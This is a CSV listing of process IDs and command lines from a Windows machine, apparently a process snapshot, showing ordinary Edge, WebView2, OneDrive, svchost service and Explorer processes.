PID,Args
3860,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=crashpad-handler ""--user-data-dir=C:\\Users\\administrator\\AppData\\Local\\Microsoft\\Edge\\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\\Users\\administrator\\AppData\\Local\\Microsoft\\Edge\\User Data\\Crashpad"" ""--metrics-dir=C:\\Users\\administrator\\AppData\\Local\\Microsoft\\Edge\\User Data"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=143.0.7499.147 ""--annotation=exe=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --annotation=plat=Win64 --annotation=prod=Edge --annotation=ver=143.0.3650.96 --initial-client-data=0x268,0x26c,0x270,0x264,0x278,0x7ff9475d62b8,0x7ff9475d62c4,0x7ff9475d62d0"
3864,"""C:\\Users\\administrator\\AppData\\Local\\Microsoft\\OneDrive\\25.222.1112.0002_1\\FileCoAuth.exe"" -Embedding"
3968,C:\\WINDOWS\\system32\\svchost.exe -k osprivacy -p -s camsvc
3972,-
3976,C:\\WINDOWS\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p -s wscsvc
4056,-
4288,C:\\WINDOWS\\System32\\svchost.exe -k LocalService -p -s LicenseManager
4336,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=gpu-process --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1936,i,1090675969617223105,7518706259324256116,262144 --field-trial-handle=2316,i,7522029994750082365,3384395441714901132,262144 --variations-seed-version --trace-process-track-uuid=3190708988185955192 --mojo-platform-channel-handle=2312 /prefetch:2"
4348,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=525.31002.10.0 --embedded-browser-webview=1 --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=1800,i,7744447157139510545,14115196967181429825,524288 --field-trial-handle=1916,i,8635894297972141277,11337288381855299968,262144 --variations-seed-version --trace-process-track-uuid=3190708989122997041 --mojo-platform-channel-handle=2136 /prefetch:11 /pfhostedapp:1f3d0ca33106b1de2a6f2986b70740d61f4ac3d5"
4428,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s TokenBroker
4496,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s UsoSvc
4688,C:\\WINDOWS\\System32\\svchost.exe -k NetworkService -p
4752,-
4788,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe
4828,C:\\WINDOWS\\system32\\svchost.exe -k UnistackSvcGroup -s WpnUserService
4872,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=crashpad-handler --user-data-dir=C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView /prefetch:4 /pfhostedapp:fc3b6dc26ff9858eea25d915469c990c41f4779f --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView\\Crashpad --metrics-dir=C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=143.0.7499.147 ""--annotation=exe=C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --annotation=plat=Win64 ""--annotation=prod=Edge WebView2"" --annotation=ver=143.0.3650.96 --initial-client-data=0x16c,0x170,0x174,0x148,0x17c,0x7ff9475d62b8,0x7ff9475d62c4,0x7ff9475d62d0"
4908,C:\\WINDOWS\\system32\\svchost.exe -k LocalService -p -s CDPSvc
4920,C:\\WINDOWS\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p
5136,C:\\WINDOWS\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost
5168,-
5212,C:\\WINDOWS\\Explorer.EXE
5280,"""C:\\Windows\\System32\\ShellHost.exe"""
